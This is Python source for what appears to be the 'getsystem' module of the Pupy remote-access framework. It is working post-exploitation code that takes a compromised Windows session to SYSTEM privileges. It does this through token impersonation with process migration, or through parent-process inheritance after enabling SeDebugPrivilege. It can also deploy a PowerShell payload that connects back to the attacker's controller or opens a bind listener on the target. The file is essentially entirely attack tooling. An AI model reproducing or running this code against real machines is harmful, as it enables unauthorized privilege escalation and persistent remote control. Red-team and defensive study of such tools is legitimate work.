# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from modules.lib.windows.migrate import migrate

from modules.lib.windows import powerloader

import os

__class_name__ = "GetSystem"


@config(compat="windows", category="privesc")
class GetSystem(PupyModule):

    """
    Try to get NT AUTHORITY SYSTEM privileges

    - Case 1: If the launcher on the target uses a reverse connection (e.g. connect or auto_proxy),
    this module will migrate on a created SYSTEM process ('impersonate' method) or
    it will create a new SYSTEM process thanks to a handle inheritance ('inheritance' method) aka 'parent method'.
    In this case, the created SYSTEM launcher will connect to your pupy contoller automatically.
    - Case 2: If the launcher on the target uses a bind connection, this module will enable the 'powershell' option by default.
    In this case, a payload will be uploaded and it will be executed as System on the target.
    This payload listens on your given port on the target. You have to connect to this launcher manually.
    """

    dependencies = ["pupwinutils.security", "pupwinutils.processes"]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="getsystem", description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-m', '--method', dest='method', choices=['impersonate', 'inheritance'],
            default=None, help='Method for gaining a new pupy session as SYSTEM',
            required=True,
        )
        cls.arg_parser.add_argument(
            '-x', dest='execute', default=None,
            help='Change the default process to create/inject into'
        )
        cls.arg_parser.add_argument(
            '-r', dest='restart', action='store_true', default=False,
            help='Relaunch current executable as system (dangerous)'
        )
        cls.arg_parser.add_argument(
            '-p', dest='powershell', action='store_true', default=False,
            help='Force to use a powershell payload'
        )
        cls.arg_parser.add_argument(
            '--ppid', dest='parentID', type=int, default=None,
            help="Force this ppid ('inheritance' method only)"
        )
        cls.arg_parser.add_argument(
            '-k', dest='keep', action='store_false', default=True,
            help="Close this current connection after migration ('impersonate' method only)"
        )

        cls.arg_parser.add_argument(
            '-t', dest='timeout', default=60, type=int,
            help="Wait n seconds a reverse connection during migration (default: %(default)s) "
            "('impersonate' method only)")

    def run(self, args):

        # Command to execute on the target
        cmdToExecute = None

        # The the local file which contains PS1 script (when powershell chosen or enabled automcatically)
        local_file = ''

        # True if ps1 script will be used in bind mode. If reverse connection with ps1 then False
        isBindLauncherForPs1 = False

        # Contains ip:port used for bind connection on the target with ps1 script.
        # None if reverse connection and (consequently) isBindLauncherForPs1==False

        listeningAddressPortForBindPs1 = None
        # Usefull information for bind mode connection (ps1 script)
        launcherType, addressPort = self.client.desc['launcher'], self.client.desc['address']

        completion = None

        # Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
        if launcherType == "bind":
            self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))
            isBindLauncherForPs1 = True
            self.info('Consequently, powershell option is enabled automatically')
            args.powershell = True
        else:
            self.info('The current pupy launcher is using a REVERSE connection (e.g. \'auto_proxy\' or \'connect\' launcher)')
            isBindLauncherForPs1 = False

        # A Powershell payload is used for getting a pupy session as SYSTEM
        if args.powershell:
            self.info('A powershell payload will be used for getting a pupy session as SYSTEM')
            clientConfToUse = None

            if isBindLauncherForPs1:
                self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))
                self.info("Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port")
                self.info("Be careful, you have to choose a port which is not used on the target!")
                listeningPort = -1
                while listeningPort==-1:
                    try:
                        listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                    except Exception as e:
                        self.warning("You have to give me a valid port. Try again. ({})".format(e))
                listeningAddress = addressPort.split(':')[0]
                listeningAddressPortForBindPs1 = "{0}:{1}".format(listeningAddress, listeningPort)
                self.info("The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target".format(listeningAddressPortForBindPs1))
                bindConf = self.client.get_conf()
                #Modify the listening port on the conf. If it is not modified, the ps1 script will listen on the same port as the inital pupy launcher on the target
                bindConf['launcher_args'][bindConf['launcher_args'].index("--port")+1] = str(listeningPort)
                clientConfToUse = bindConf
            else:
                self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')
                clientConfToUse = self.client.get_conf()

            cmdToExecute, completion = powerloader.serve(self, clientConfToUse)

        # restart current exe as system
        if args.restart:
            self.info('Trying to configure for running the current executable on the target as SYSTEM')
            exe = self.client.desc['exec_path'].split('\\')
            if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
                self.warning('It is not recommended to restart it')
                return

            cmdToExecute = self.client.desc['exec_path']

        if args.method == 'inheritance':
            if not cmdToExecute:
                cmdToExecute = args.execute

            if cmdToExecute is None:
                self.error(
                    'Application to execute with SYSTEM privileges should '
                    'be specified with one of -x/-p/-r args')
                return

            try:
                enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)
                enable_privilege('SeDebugPrivilege')
                self.success('{} enabled'.format('SeDebugPrivilege'))
            except Exception as e:
                self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))

            create_new_process_from_ppid = self.client.remote(
                'pupwinutils.security', 'create_new_process_from_ppid', False)

            if args.parentID:
                self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))
                self.info('Command: {}'.format(cmdToExecute))

                pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)
                self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))
                return

            else:
                self.info("Getting information about all processes running on the target")

                enum_processes = self.client.remote('pupwinutils.processes', 'enum_processes')
                get_integrity_level = self.client.remote('pupwinutils.security', 'get_integrity_level', False)

                self.info("Searching a process with a 'SYSTEM' integrity level")

                for aprocess in enum_processes():
                    integrityLevel = get_integrity_level(aprocess['pid'])

                    if not integrityLevel == 'System':
                        continue

                    self.info("{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it".format(
                        aprocess['name'], aprocess['pid']))

                    try:
                        pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)
                        self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))
                        break

                    except Exception as e:
                        self.error('Failed: {}'.format(' '.join(x for x in e.args if type(x) is str)))

        elif args.method == 'impersonate':
            if cmdToExecute is None:
                cmdToExecute = args.execute or 'cmd.exe'

            getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)
            proc_pid = getsystem(cmdToExecute)

            self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))
            migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)
            return

        if args.powershell:
            if completion and not completion.is_set():
                self.info('Waiting for PowerLoader completion')
                completion.wait()

            if isBindLauncherForPs1:
                self.success(
                    'You have to connect to the target manually on {0}: '
                    'try "connect --host {0}" in pupy shell'.format(listeningAddressPortForBindPs1))
            else:
                self.success('Waiting for a connection (take few seconds, 1 min max)...')

            if local_file:
                os.remove(local_file)
